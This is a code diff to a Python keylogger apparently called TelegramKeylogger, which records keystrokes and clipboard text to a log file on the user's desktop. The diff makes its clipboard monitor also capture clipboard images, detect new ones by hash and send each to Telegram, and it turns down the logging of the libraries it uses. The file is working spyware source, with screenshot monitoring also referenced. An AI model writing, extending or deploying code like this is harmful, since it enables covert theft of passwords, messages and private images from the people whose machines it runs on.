@@ -1,10 +1,16 @@
+import io
+
+from PIL import ImageGrab
+from pynput.keyboard import Key, Listener
 import logging
 import getpass
 import threading
 import time
 from pynput import keyboard
 import pyautogui
+import os
 from KeyloggerManager import TelegramKeylogger
+import hashlib
 
 try:
     import win32api
@@ -20,6 +26,10 @@ file_handler = logging.FileHandler(f'C:/Users/{username}/OneDrive/Desktop/logfil
 formatter = logging.Formatter('[{asctime}]: {message}', style='{', datefmt='%Y-%m-%d %H:%M:%S')
 file_handler.setFormatter(formatter)
 logger.addHandler(file_handler)
+
+logging.getLogger('PIL').setLevel(logging.WARNING)
+logging.getLogger('png').setLevel(logging.WARNING)
+logging.getLogger('pyautogui').setLevel(logging.WARNING)
 
 KEY_MAPPING = {
     "EN": {
@@ -159,15 +169,42 @@ def on_release(key):
 
 def clipboard_monitor(interval=5):
     import pyperclip
-    recent = ""
+
+    recent_text = ""
+    recent_image_hash = ""
+
     while True:
         try:
-            current = pyperclip.paste()
-        except Exception:
-            current = ""
-        if current != recent and current.strip():
-            recent = current
-            logger.info(f"CLIPBOARD_CHANGED: {recent}")
+            current_text = pyperclip.paste()
+            if current_text != recent_text and current_text.strip():
+                recent_text = current_text
+                logger.info(f"CLIPBOARD_TEXT: {recent_text}")
+
+        except Exception as e:
+            logger.error(f"Clipboard monitor error: {e}")
+
+        try:
+            image = ImageGrab.grabclipboard()
+            if image is not None:
+                # Создаем хэш изображения для сравнения
+                img_bytes = io.BytesIO()
+                image.save(img_bytes, format='PNG')
+                img_bytes.seek(0)
+                current_image_hash = hashlib.md5(img_bytes.getvalue()).hexdigest()
+
+                if not recent_image_hash or current_image_hash != recent_image_hash:
+                    recent_image_hash = current_image_hash
+                    logger.info("CLIPBOARD_IMAGE: Image captured from clipboard")
+
+                    success = keylogger_manager.send_clipboard_image(image)
+                    if success:
+                        logger.info("CLIPBOARD_IMAGE: Image sent to Telegram")
+                    else:
+                        logger.error("CLIPBOARD_IMAGE: Failed to send image to Telegram")
+
+        except Exception as img_error:
+            print(f"{img_error}")
+
         time.sleep(interval)
 
 def screenshot_monitor(interval=30):
